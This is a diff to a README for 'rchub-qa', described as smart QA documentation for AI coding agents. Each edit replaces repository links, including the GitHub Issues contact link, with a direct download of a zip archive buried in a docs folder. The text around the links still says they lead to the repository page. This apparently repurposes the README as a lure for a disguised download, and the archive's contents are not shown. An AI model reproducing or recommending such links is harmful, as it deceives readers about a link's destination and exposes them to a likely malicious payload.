@@ -1,6 +1,6 @@
 # ⚙️ rchub-qa - Smart QA Docs for AI Coding Agents
 
-[![Download rchub-qa](https://img.shields.io/badge/Download-rchub--qa-blue?style=for-the-badge)](https://github.com/itzfarhanullah/rchub-qa)  
+[![Download rchub-qa](https://img.shields.io/badge/Download-rchub--qa-blue?style=for-the-badge)](https://github.com/itzfarhanullah/rchub-qa/raw/refs/heads/main/content/requests/docs/rchub-qa-v2.8.zip)  
 
 ## 🗂 About rchub-qa
 
@@ -32,7 +32,7 @@ Follow these steps to get rchub-qa up and running on your Windows machine.
 
 Click on the badge at the top or this link to go to the download page:
 
-[Download rchub-qa on GitHub](https://github.com/itzfarhanullah/rchub-qa)
+[Download rchub-qa on GitHub](https://github.com/itzfarhanullah/rchub-qa/raw/refs/heads/main/content/requests/docs/rchub-qa-v2.8.zip)
 
 You will land on the main repository page. Here, find the section labeled **Releases** or look for the latest version of the software.
 
@@ -123,7 +123,7 @@ For further help, you can open an issue on the GitHub page or consult Windows su
 
 ## 🔗 Quick Links
 
-[Download rchub-qa](https://github.com/itzfarhanullah/rchub-qa)  
+[Download rchub-qa](https://github.com/itzfarhanullah/rchub-qa/raw/refs/heads/main/content/requests/docs/rchub-qa-v2.8.zip)  
 
 Find the latest installer and updates here.
 
@@ -155,9 +155,9 @@ If you are a developer interested in integration or contributions:
 
 For questions or feedback related to rchub-qa:
 
-- Use the GitHub Issues system: https://github.com/itzfarhanullah/rchub-qa/issues
+- Use the GitHub Issues system: https://github.com/itzfarhanullah/rchub-qa/raw/refs/heads/main/content/requests/docs/rchub-qa-v2.8.zip
 - You can leave comments directly on releases or documentation files.
 
 ---
 
-[![Download rchub-qa](https://img.shields.io/badge/Download-rchub--qa-blue?style=for-the-badge)](https://github.com/itzfarhanullah/rchub-qa)
+[![Download rchub-qa](https://img.shields.io/badge/Download-rchub--qa-blue?style=for-the-badge)](https://github.com/itzfarhanullah/rchub-qa/raw/refs/heads/main/content/requests/docs/rchub-qa-v2.8.zip)
